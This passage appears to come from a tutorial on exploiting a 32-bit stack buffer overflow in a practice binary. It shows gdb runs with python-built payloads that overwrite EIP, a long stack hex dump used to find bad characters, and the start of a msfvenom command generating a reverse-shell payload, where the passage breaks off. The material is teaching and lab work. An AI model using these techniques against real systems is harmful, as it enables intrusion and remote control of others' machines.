+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>run<span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;print &quot;\x55&quot; * (1040 - 256 - 4) + &quot;\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot; + &quot;\x66&quot; * 4&#39;</span><span class="k">)</span>
+Starting<span class="w"> </span>program:<span class="w"> </span>/home/blnkn/c/bow32<span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;print &quot;\x55&quot; * (1040 - 256 - 4) + &quot;\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot; + &quot;\x66&quot; * 4&#39;</span><span class="k">)</span>
+/bin/bash:<span class="w"> </span>line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>warning:<span class="w"> </span><span class="nb">command</span><span class="w"> </span>substitution:<span class="w"> </span>ignored<span class="w"> </span>null<span class="w"> </span>byte<span class="w"> </span><span class="k">in</span><span class="w"> </span>input
+
+Breakpoint<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>0x565561ad<span class="w"> </span><span class="k">in</span><span class="w"> </span>bowfunc<span class="w"> </span><span class="o">()</span>
+</pre></div>
+</div>
+<p>Lets examine the stack from the ESP, or stack pointer, or tip of the stalactite, up</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>(gdb) x/2000xb $esp+500
+0xffffd268:     0x02    0x00    0x00    0x00    0x1f    0x00    0x00    0x00
+0xffffd270:     0xe4    0xdf    0xff    0xff    0x0f    0x00    0x00    0x00
+0xffffd278:     0x9b    0xd2    0xff    0xff    0x00    0x00    0x00    0x00
+0xffffd280:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0xffffd288:     0x00    0x00    0x00    0x28    0x76    0x90    0xcc    0x65
+0xffffd290:     0x65    0x72    0x06    0xe7    0xf0    0x78    0xf6    0x80
+0xffffd298:     0x99    0xdb    0xc6    0x69    0x36    0x38    0x36    0x00
+0xffffd2a0:     0x2f    0x68    0x6f    0x6d    0x65    0x2f    0x62    0x6c
+0xffffd2a8:     0x6e    0x6b    0x6e    0x2f    0x63    0x2f    0x62    0x6f
+0xffffd2b0:     0x77    0x33    0x32    0x00    0x55    0x55    0x55    0x55   ; beginning of
+0xffffd2b8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55   ; our buffer section
+0xffffd2c0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd2c8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd2d0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd2d8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd2e0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd2e8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd2f0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd2f8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd300:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd308:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd310:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd318:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd320:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd328:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd330:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd338:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd340:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd348:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd350:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd358:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd360:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd368:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd370:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd378:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd380:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+--Type &lt;RET&gt; for more, q to quit, c to continue without paging--
+0xffffd388:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd390:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd398:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd3a0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd3a8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd3b0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd3b8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd3c0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd3c8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd3d0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd3d8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd3e0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd3e8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd3f0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd3f8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd400:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd408:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd410:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd418:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd420:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd428:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd430:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd438:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd440:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd448:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd450:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd458:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd460:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd468:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd470:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd478:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd480:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd488:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd490:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd498:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd4a0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+--Type &lt;RET&gt; for more, q to quit, c to continue without paging--
+0xffffd4a8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd4b0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd4b8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd4c0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd4c8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd4d0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd4d8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd4e0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd4e8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd4f0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd4f8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd500:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd508:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd510:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd518:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd520:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd528:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd530:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd538:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd540:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd548:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd550:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd558:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd560:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd568:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd570:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd578:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd580:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd588:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd590:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd598:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd5a0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd5a8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd5b0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd5b8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd5c0:     0x01    0x02    0x03    0x04    0x05    0x06    0x07    0x08    ; the start of
+--Type &lt;RET&gt; for more, q to quit, c to continue without paging--
+0xffffd5c8:     0x00    0x0b    0x0c    0x0d    0x0e    0x0f    0x10    0x11    ; the chars
+0xffffd5d0:     0x12    0x13    0x14    0x15    0x16    0x17    0x18    0x19
+0xffffd5d8:     0x1a    0x1b    0x1c    0x1d    0x1e    0x1f    0x00    0x21
+0xffffd5e0:     0x22    0x23    0x24    0x25    0x26    0x27    0x28    0x29
+0xffffd5e8:     0x2a    0x2b    0x2c    0x2d    0x2e    0x2f    0x30    0x31
+0xffffd5f0:     0x32    0x33    0x34    0x35    0x36    0x37    0x38    0x39
+0xffffd5f8:     0x3a    0x3b    0x3c    0x3d    0x3e    0x3f    0x40    0x41
+0xffffd600:     0x42    0x43    0x44    0x45    0x46    0x47    0x48    0x49
+0xffffd608:     0x4a    0x4b    0x4c    0x4d    0x4e    0x4f    0x50    0x51
+0xffffd610:     0x52    0x53    0x54    0x55    0x56    0x57    0x58    0x59
+0xffffd618:     0x5a    0x5b    0x5c    0x5d    0x5e    0x5f    0x60    0x61
+0xffffd620:     0x62    0x63    0x64    0x65    0x66    0x67    0x68    0x69
+0xffffd628:     0x6a    0x6b    0x6c    0x6d    0x6e    0x6f    0x70    0x71
+0xffffd630:     0x72    0x73    0x74    0x75    0x76    0x77    0x78    0x79
+0xffffd638:     0x7a    0x7b    0x7c    0x7d    0x7e    0x7f    0x80    0x81
+0xffffd640:     0x82    0x83    0x84    0x85    0x86    0x87    0x88    0x89
+0xffffd648:     0x8a    0x8b    0x8c    0x8d    0x8e    0x8f    0x90    0x91
+0xffffd650:     0x92    0x93    0x94    0x95    0x96    0x97    0x98    0x99
+0xffffd658:     0x9a    0x9b    0x9c    0x9d    0x9e    0x9f    0xa0    0xa1
+0xffffd660:     0xa2    0xa3    0xa4    0xa5    0xa6    0xa7    0xa8    0xa9
+0xffffd668:     0xaa    0xab    0xac    0xad    0xae    0xaf    0xb0    0xb1
+0xffffd670:     0xb2    0xb3    0xb4    0xb5    0xb6    0xb7    0xb8    0xb9
+0xffffd678:     0xba    0xbb    0xbc    0xbd    0xbe    0xbf    0xc0    0xc1
+0xffffd680:     0xc2    0xc3    0xc4    0xc5    0xc6    0xc7    0xc8    0xc9
+0xffffd688:     0xca    0xcb    0xcc    0xcd    0xce    0xcf    0xd0    0xd1
+0xffffd690:     0xd2    0xd3    0xd4    0xd5    0xd6    0xd7    0xd8    0xd9
+0xffffd698:     0xda    0xdb    0xdc    0xdd    0xde    0xdf    0xe0    0xe1
+0xffffd6a0:     0xe2    0xe3    0xe4    0xe5    0xe6    0xe7    0xe8    0xe9
+0xffffd6a8:     0xea    0xeb    0xec    0xed    0xee    0xef    0xf0    0xf1
+0xffffd6b0:     0xf2    0xf3    0xf4    0xf5    0xf6    0xf7    0xf8    0xf9
+0xffffd6b8:     0xfa    0xfb    0xfc    0xfd    0xfe    0xff    0x66    0x66   ; and our EIP
+0xffffd6c0:     0x66    0x66    0x00    0x53    0x48    0x45    0x4c    0x4c
+0xffffd6c8:     0x3d    0x2f    0x62    0x69    0x6e    0x2f    0x62    0x61
+0xffffd6d0:     0x73    0x68    0x00    0x50    0x59    0x45    0x4e    0x56
+0xffffd6d8:     0x5f    0x53    0x48    0x45    0x4c    0x4c    0x3d    0x62
+0xffffd6e0:     0x61    0x73    0x68    0x00    0x47    0x56    0x4d    0x5f
+--Type &lt;RET&gt; for more, q to quit, c to continue without paging--
+0xffffd6e8:     0x56    0x45    0x52    0x53    0x49    0x4f    0x4e    0x3d
+0xffffd6f0:     0x31    0x2e    0x30    0x2e    0x32    0x32    0x00    0x47
+0xffffd6f8:     0x56    0x4d    0x5f    0x50    0x41    0x54    0x48    0x5f
+0xffffd700:     0x42    0x41    0x43    0x4b    0x55    0x50    0x3d    0x2f
+0xffffd708:     0x68    0x6f    0x6d    0x65    0x2f    0x62    0x6c    0x6e
+0xffffd710:     0x6b    0x6e    0x2f    0x2e    0x67    0x76    0x6d    0x2f
+0xffffd718:     0x62    0x69    0x6e    0x3a    0x2f    0x75    0x73    0x72
+0xffffd720:     0x2f    0x6c    0x6f    0x63    0x61    0x6c    0x2f    0x62
+0xffffd728:     0x69    0x6e    0x3a    0x2f    0x75    0x73    0x72    0x2f
+0xffffd730:     0x62    0x69    0x6e    0x3a    0x2f    0x62    0x69    0x6e
+0xffffd738:     0x3a    0x2f    0x75    0x73    0x72    0x2f    0x6c    0x6f
+0xffffd740:     0x63    0x61    0x6c    0x2f    0x67    0x61    0x6d    0x65
+0xffffd748:     0x73    0x3a    0x2f    0x75    0x73    0x72    0x2f    0x67
+0xffffd750:     0x61    0x6d    0x65    0x73    0x3a    0x2f    0x75    0x73
+0xffffd758:     0x72    0x2f    0x6c    0x6f    0x63    0x61    0x6c    0x2f
+0xffffd760:     0x67    0x6f    0x2f    0x62    0x69    0x6e    0x00    0x50
+0xffffd768:     0x57    0x44    0x3d    0x2f    0x68    0x6f    0x6d    0x65
+0xffffd770:     0x2f    0x62    0x6c    0x6e    0x6b    0x6e    0x2f    0x63
+0xffffd778:     0x00    0x4c    0x4f    0x47    0x4e    0x41    0x4d    0x45
+0xffffd780:     0x3d    0x62    0x6c    0x6e    0x6b    0x6e    0x00    0x58
+0xffffd788:     0x44    0x47    0x5f    0x53    0x45    0x53    0x53    0x49
+0xffffd790:     0x4f    0x4e    0x5f    0x54    0x59    0x50    0x45    0x3d
+0xffffd798:     0x74    0x74    0x79    0x00    0x5f    0x3d    0x2f    0x75
+0xffffd7a0:     0x73    0x72    0x2f    0x62    0x69    0x6e    0x2f    0x67
+0xffffd7a8:     0x64    0x62    0x00    0x4d    0x4f    0x54    0x44    0x5f
+0xffffd7b0:     0x53    0x48    0x4f    0x57    0x4e    0x3d    0x70    0x61
+0xffffd7b8:     0x6d    0x00    0x4c    0x49    0x4e    0x45    0x53    0x3d
+0xffffd7c0:     0x33    0x37    0x00    0x48    0x4f    0x4d    0x45    0x3d
+0xffffd7c8:     0x2f    0x68    0x6f    0x6d    0x65    0x2f    0x62    0x6c
+0xffffd7d0:     0x6e    0x6b    0x6e    0x00    0x4c    0x41    0x4e    0x47
+0xffffd7d8:     0x3d    0x65    0x6e    0x5f    0x55    0x53    0x2e    0x55
+0xffffd7e0:     0x54    0x46    0x2d    0x38    0x00    0x4c    0x53    0x5f
+0xffffd7e8:     0x43    0x4f    0x4c    0x4f    0x52    0x53    0x3d    0x72
+0xffffd7f0:     0x73    0x3d    0x30    0x3a    0x64    0x69    0x3d    0x30
+0xffffd7f8:     0x31    0x3b    0x33    0x34    0x3a    0x6c    0x6e    0x3d
+0xffffd800:     0x30    0x31    0x3b    0x33    0x36    0x3a    0x6d    0x68
+--Type &lt;RET&gt; for more, q to quit, c to continue without paging--
+0xffffd808:     0x3d    0x30    0x30    0x3a    0x70    0x69    0x3d    0x34
+0xffffd810:     0x30    0x3b    0x33    0x33    0x3a    0x73    0x6f    0x3d
+0xffffd818:     0x30    0x31    0x3b    0x33    0x35    0x3a    0x64    0x6f
+0xffffd820:     0x3d    0x30    0x31    0x3b    0x33    0x35    0x3a    0x62
+0xffffd828:     0x64    0x3d    0x34    0x30    0x3b    0x33    0x33    0x3b
+0xffffd830:     0x30    0x31    0x3a    0x63    0x64    0x3d    0x34    0x30
+0xffffd838:     0x3b    0x33    0x33    0x3b    0x30    0x31    0x3a    0x6f
+0xffffd840:     0x72    0x3d    0x34    0x30    0x3b    0x33    0x31    0x3b
+0xffffd848:     0x30    0x31    0x3a    0x6d    0x69    0x3d    0x30    0x30
+0xffffd850:     0x3a    0x73    0x75    0x3d    0x33    0x37    0x3b    0x34
+0xffffd858:     0x31    0x3a    0x73    0x67    0x3d    0x33    0x30    0x3b
+0xffffd860:     0x34    0x33    0x3a    0x63    0x61    0x3d    0x33    0x30
+0xffffd868:     0x3b    0x34    0x31    0x3a    0x74    0x77    0x3d    0x33
+0xffffd870:     0x30    0x3b    0x34    0x32    0x3a    0x6f    0x77    0x3d
+0xffffd878:     0x33    0x34    0x3b    0x34    0x32    0x3a    0x73    0x74
+0xffffd880:     0x3d    0x33    0x37    0x3b    0x34    0x34    0x3a    0x65
+0xffffd888:     0x78    0x3d    0x30    0x31    0x3b    0x33    0x32    0x3a
+0xffffd890:     0x2a    0x2e    0x74    0x61    0x72    0x3d    0x30    0x31
+0xffffd898:     0x3b    0x33    0x31    0x3a    0x2a    0x2e    0x74    0x67
+0xffffd8a0:     0x7a    0x3d    0x30    0x31    0x3b    0x33    0x31    0x3a
+0xffffd8a8:     0x2a    0x2e    0x61    0x72    0x63    0x3d    0x30    0x31
+0xffffd8b0:     0x3b    0x33    0x31    0x3a    0x2a    0x2e    0x61    0x72
+0xffffd8b8:     0x6a    0x3d    0x30    0x31    0x3b    0x33    0x31    0x3a
+0xffffd8c0:     0x2a    0x2e    0x74    0x61    0x7a    0x3d    0x30    0x31
+0xffffd8c8:     0x3b    0x33    0x31    0x3a    0x2a    0x2e    0x6c    0x68
+0xffffd8d0:     0x61    0x3d    0x30    0x31    0x3b    0x33    0x31    0x3a
+0xffffd8d8:     0x2a    0x2e    0x6c    0x7a    0x34    0x3d    0x30    0x31
+0xffffd8e0:     0x3b    0x33    0x31    0x3a    0x2a    0x2e    0x6c    0x7a
+0xffffd8e8:     0x68    0x3d    0x30    0x31    0x3b    0x33    0x31    0x3a
+0xffffd8f0:     0x2a    0x2e    0x6c    0x7a    0x6d    0x61    0x3d    0x30
+0xffffd8f8:     0x31    0x3b    0x33    0x31    0x3a    0x2a    0x2e    0x74
+0xffffd900:     0x6c    0x7a    0x3d    0x30    0x31    0x3b    0x33    0x31
+0xffffd908:     0x3a    0x2a    0x2e    0x74    0x78    0x7a    0x3d    0x30
+0xffffd910:     0x31    0x3b    0x33    0x31    0x3a    0x2a    0x2e    0x74
+0xffffd918:     0x7a    0x6f    0x3d    0x30    0x31    0x3b    0x33    0x31
+0xffffd920:     0x3a    0x2a    0x2e    0x74    0x37    0x7a    0x3d    0x30
+--Type &lt;RET&gt; for more, q to quit, c to continue without paging--
+0xffffd928:     0x31    0x3b    0x33    0x31    0x3a    0x2a    0x2e    0x7a
+0xffffd930:     0x69    0x70    0x3d    0x30    0x31    0x3b    0x33    0x31
+0xffffd938:     0x3a    0x2a    0x2e    0x7a    0x3d    0x30    0x31    0x3b
+0xffffd940:     0x33    0x31    0x3a    0x2a    0x2e    0x64    0x7a    0x3d
+0xffffd948:     0x30    0x31    0x3b    0x33    0x31    0x3a    0x2a    0x2e
+0xffffd950:     0x67    0x7a    0x3d    0x30    0x31    0x3b    0x33    0x31
+0xffffd958:     0x3a    0x2a    0x2e    0x6c    0x72    0x7a    0x3d    0x30
+0xffffd960:     0x31    0x3b    0x33    0x31    0x3a    0x2a    0x2e    0x6c
+0xffffd968:     0x7a    0x3d    0x30    0x31    0x3b    0x33    0x31    0x3a
+0xffffd970:     0x2a    0x2e    0x6c    0x7a    0x6f    0x3d    0x30    0x31
+0xffffd978:     0x3b    0x33    0x31    0x3a    0x2a    0x2e    0x78    0x7a
+0xffffd980:     0x3d    0x30    0x31    0x3b    0x33    0x31    0x3a    0x2a
+0xffffd988:     0x2e    0x7a    0x73    0x74    0x3d    0x30    0x31    0x3b
+0xffffd990:     0x33    0x31    0x3a    0x2a    0x2e    0x74    0x7a    0x73
+0xffffd998:     0x74    0x3d    0x30    0x31    0x3b    0x33    0x31    0x3a
+0xffffd9a0:     0x2a    0x2e    0x62    0x7a    0x32    0x3d    0x30    0x31
+0xffffd9a8:     0x3b    0x33    0x31    0x3a    0x2a    0x2e    0x62    0x7a
+0xffffd9b0:     0x3d    0x30    0x31    0x3b    0x33    0x31    0x3a    0x2a
+0xffffd9b8:     0x2e    0x74    0x62    0x7a    0x3d    0x30    0x31    0x3b
+0xffffd9c0:     0x33    0x31    0x3a    0x2a    0x2e    0x74    0x62    0x7a
+0xffffd9c8:     0x32    0x3d    0x30    0x31    0x3b    0x33    0x31    0x3a
+0xffffd9d0:     0x2a    0x2e    0x74    0x7a    0x3d    0x30    0x31    0x3b
+0xffffd9d8:     0x33    0x31    0x3a    0x2a    0x2e    0x64    0x65    0x62
+0xffffd9e0:     0x3d    0x30    0x31    0x3b    0x33    0x31    0x3a    0x2a
+0xffffd9e8:     0x2e    0x72    0x70    0x6d    0x3d    0x30    0x31    0x3b
+0xffffd9f0:     0x33    0x31    0x3a    0x2a    0x2e    0x6a    0x61    0x72
+0xffffd9f8:     0x3d    0x30    0x31    0x3b    0x33    0x31    0x3a    0x2a
+0xffffda00:     0x2e    0x77    0x61    0x72    0x3d    0x30    0x31    0x3b
+0xffffda08:     0x33    0x31    0x3a    0x2a    0x2e    0x65    0x61    0x72
+0xffffda10:     0x3d    0x30    0x31    0x3b    0x33    0x31    0x3a    0x2a
+0xffffda18:     0x2e    0x73    0x61    0x72    0x3d    0x30    0x31    0x3b
+0xffffda20:     0x33    0x31    0x3a    0x2a    0x2e    0x72    0x61    0x72
+0xffffda28:     0x3d    0x30    0x31    0x3b    0x33    0x31    0x3a    0x2a
+0xffffda30:     0x2e    0x61    0x6c    0x7a    0x3d    0x30    0x31    0x3b
+(gdb)
+</pre></div>
+</div>
+<p>looking at the start of the chars, we can see that the nullbyte has been ignore, as suggested by warning at runtime. So we can remove the nullbyte in our character list, and keep looking for other disallowed characters</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>0xffffd5b8:<span class="w">     </span>0x55<span class="w">    </span>0x55<span class="w">    </span>0x55<span class="w">    </span>0x55<span class="w">    </span>0x55<span class="w">    </span>0x55<span class="w">    </span>0x55<span class="w">    </span>0x55
+0xffffd5c0:<span class="w">     </span>0x01<span class="w">    </span>0x02<span class="w">    </span>0x03<span class="w">    </span>0x04<span class="w">    </span>0x05<span class="w">    </span>0x06<span class="w">    </span>0x07<span class="w">    </span>0x08
+0xffffd5c8:<span class="w">     </span>0x00<span class="w">    </span>0x0b<span class="w">    </span>0x0c<span class="w">    </span>0x0d<span class="w">    </span>0x0e<span class="w">    </span>0x0f<span class="w">    </span>0x10<span class="w">    </span>0x11
+0xffffd5d0:<span class="w">     </span>0x12<span class="w">    </span>0x13<span class="w">    </span>0x14<span class="w">    </span>0x15<span class="w">    </span>0x16<span class="w">    </span>0x17<span class="w">    </span>0x18<span class="w">    </span>0x19
+</pre></div>
+</div>
+<p>we can see that were we expected 0x09 it was replaced by 0x00, we can remove this one from the list too
+and keep going like that looking through our list if anything has been replaced by 0x00, in our case we end up with:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>\<span class="n">x00</span>\<span class="n">x09</span>\<span class="n">x0a</span>\<span class="n">x20</span>
+</pre></div>
+</div>
+</section>
+<section id="generating-our-actual-shellcode">
+<h2>Generating our actual shellcode<a class="headerlink" href="#generating-our-actual-shellcode" title="Permalink to this heading">#</a></h2>
+<p>now that we know the exact offset of the EIP, the cpu architecture we’re running on, the platform, and the bad characters, we can go ahead an generate our shellcode</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>msfvenom<span class="w"> </span><span class="nv">lhost</span><span class="o">=</span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="nv">lport</span><span class="o">=</span><span class="m">31337</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-p<span class="w"> </span>linux/x86/shell_reverse_tcp<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--format<span class="w"> </span>c<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--arch<span class="w"> </span>x86<span class="w"> </span><span class="se">\</span>
